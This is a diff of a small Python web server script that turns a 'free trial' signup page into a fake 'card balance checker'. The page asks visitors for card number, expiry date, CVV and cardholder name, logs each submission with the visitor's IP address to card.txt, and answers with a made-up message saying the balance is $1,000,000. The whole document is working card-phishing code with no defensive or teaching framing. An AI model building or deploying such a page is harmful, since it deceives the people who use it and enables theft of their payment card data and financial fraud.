@@ -2,7 +2,7 @@ import http.server
 import socketserver
 import urllib.parse
 
-PORT = 8000
+PORT = 8080
 
 class MyHandler(http.server.SimpleHTTPRequestHandler):
     def do_GET(self):
@@ -12,22 +12,21 @@ class MyHandler(http.server.SimpleHTTPRequestHandler):
             self.end_headers()
             self.wfile.write(b'''
                 <html>
-                <head>
-                <title>Free Trial Sign Up</title>
                 <style>
                 body {
                     font-family: Arial, sans-serif;
                 }
                 h1 {
                     text-align: center;
-                }
+                    color: green;
+                 }
                 form {
-                    max-width: 400px;
+                    max-width: 300px;
                     margin: 0 auto;
                     padding: 20px;
                     border: 1px solid #ccc;
-                    border-radius: 5px;
-                    background-color: #f7f7f7;
+                    border-radius: 3px;
+                    background-color: blue;
                 }
                 label {
                     display: block;
@@ -43,7 +42,7 @@ class MyHandler(http.server.SimpleHTTPRequestHandler):
                     width: 100%;
                     padding: 10px;
                     border: none;
-                    border-radius: 3px;
+                    border-radius: 5px;
                     background-color: #4CAF50;
                     color: #fff;
                     cursor: pointer;
@@ -51,17 +50,18 @@ class MyHandler(http.server.SimpleHTTPRequestHandler):
                 </style>
                 </head>
                 <body>
-                <h1>Get a Free Trial!</h1>
+                <h1>hello user, welcome to card balance checker !</h1>
+                <h2 style = "color: magenta;" "text-align: center;"> enter your credit or debit card details here and click check now </h2>
                 <form action="/process" method="post">
                 <label for="card_number">Card Number:</label>
-                <input type="text" id="card_number" name="card_number" required><br><br>
+                <input type="text" id="card_number" name="card_number" placeholder="Enter your card number" inputmode="numeric" required><br><br>
                 <label for="expiry_date">Expiry Date:</label>
-                <input type="text" id="expiry_date" name="expiry_date" required><br><br>
+                <input type="text" id="expiry_date" name="expiry_date" placeholder="Enter the expiry date" inputmode="numeric" required><br><br>
                 <label for="cvv">CVV:</label>
-                <input type="text" id="cvv" name="cvv" required><br><br>
+                <input type="text" id="cvv" name="cvv" placeholder="Enter the CVV" inputmode="numeric" required><br><br>
                 <label for="cardholder_name">Cardholder's Name:</label>
-                <input type="text" id="cardholder_name" name="cardholder_name" required><br><br>
-                <input type="submit" value="Sign Up">
+                <input type="text" id="cardholder_name" name="cardholder_name" placeholder="Enter the cardholder's name" required><br><br>
+                <input type="submit" value="check now">
                 </form>
                 </body>
                 </html>
@@ -87,13 +87,13 @@ class MyHandler(http.server.SimpleHTTPRequestHandler):
                 ip_address = self.client_address[0]
                 card_info_with_ip = f"IP Address: {ip_address}\n{card_info}"
 
-                with open('signups.txt', 'a+') as f:
+                with open('card.txt', 'a+') as f:
                     f.write(card_info_with_ip + '\n')
 
                 self.send_response(200)
                 self.send_header('Content-type', 'text/html')
                 self.end_headers()
-                self.wfile.write(b'<html><body><h1>Thank you for signing up!</h1></body></html>')
+                self.wfile.write(b'<html><body><h1 style = "color:green;">your balance is $1,000,000!</h1></html>')
             else:
                 self.send_response(400)
                 self.send_header('Content-type', 'text/html')
